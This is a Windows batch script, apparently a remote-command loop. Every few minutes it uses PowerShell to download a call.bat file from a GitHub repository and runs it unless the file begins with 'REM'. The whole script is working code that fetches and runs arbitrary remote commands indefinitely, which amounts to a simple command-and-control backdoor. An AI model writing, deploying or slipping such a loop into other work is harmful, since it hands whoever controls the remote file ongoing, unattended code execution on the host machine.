@echo off

:top
if exist call.bat del call.bat
timeout /t 20
call :downloadbyhackoo https://raw.githubusercontent.com/TTT2866/Globalcmd/master/Global/call.bat call.bat
For /f %%i in (call.bat) do set "var=%%i" & Goto :print
:print

if "%var%"=="REM" (echo key is there, lets not continue 
goto top)

::We don't want to run the file if we don't have to
:cont
call call.bat
timeout /t 500
goto top
:downloadbyhackoo

::https://stackoverflow.com/questions/48860214/
Set "url=%~1%"
for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
Call :Download "%url%" "%File%"
If exist "%File%" ( 
    ( Type "%File%")>con
Rem to save the contents in new text file
( Type "%File%" > %~2%)
)

::*********************************************************************************
:Download <url> <File>
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')"
::*********************************************************************************
goto :EOF
